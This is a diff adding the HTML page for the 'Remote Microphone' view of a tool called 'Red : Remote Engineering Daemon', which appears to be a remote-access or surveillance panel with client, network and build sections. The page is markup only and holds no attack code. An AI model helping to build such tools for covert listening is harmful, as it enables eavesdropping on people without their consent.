@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Red : Remote Engineering Daemon</title>
+    <link rel="stylesheet" href="../../../static/style.css">
+    <link rel="stylesheet" href="../../../static/utils/select.css">
+
+    <link rel="stylesheet" href="../../../static/surveillance/remoteMicrophone.css">
+
+    <script type="text/javascript" src="../../../static/surveillance/remoteMicrophone.js"></script>
+    <script type="text/javascript" src="../../../static/navigation.js"></script>
+
+    <link rel="icon" href="../../../static/RED.ico" />
+
+</head>
+    <body>
+        
+        <div id="panel">
+            <img id="logo" src="../../../static/icons/RED.png">
+        </div>
+        <div id="topBar">
+            <h3 id="menu" class="menu">🎙️Remote Microphone</h3>
+            <h4 id="sub-menu" class="menu"></h4>
+        </div>
+        
+        <div id="navBar">
+            <button id="butconsole" class="navButton">
+                <img width="50%" style="margin-top:5px" src="../../../static/icons/home.png">
+            </button>
+
+            <button id="butclient" class="navButton">
+                <img width="50%" style="margin-top:5px;" src="../../../static/icons/clients.png">
+            </button>
+
+            <button id="butnetwork" class="navButton">
+                <img width="50%" style="margin-top:5px;opacity:10%;" src="../../../static/icons/network.png">
+            </button>
+
+            <button id="butbuild" class="navButton">
+                <img width="50%" style="margin-top:5px;" src="../../../static/icons/build.png">
+            </button>
+        </div>
+
+        <div id="top-wrapper">
+            <div id="wrapper-select">
+                <select id="selectMic">
+                    
+                </select>                  
+            </div>
+        </div>
+
+        <div id="wrapper">
+            <div class="box">
+                <div class="object">
+                    <div class="outline outline-off">
+                    </div>
+                    <div class="outline outline-off" id="delayed">
+                    </div>
+                    <div class="button" id="circleout">
+                    </div>
+                    <div class="button" id="circlein">
+                        <img src="../../../static/icons/micro.png" class="mic-icon">
+                    </div>
+                </div>
+           </div>
+        </div>
+
+        
+
+    </body>
+</html>
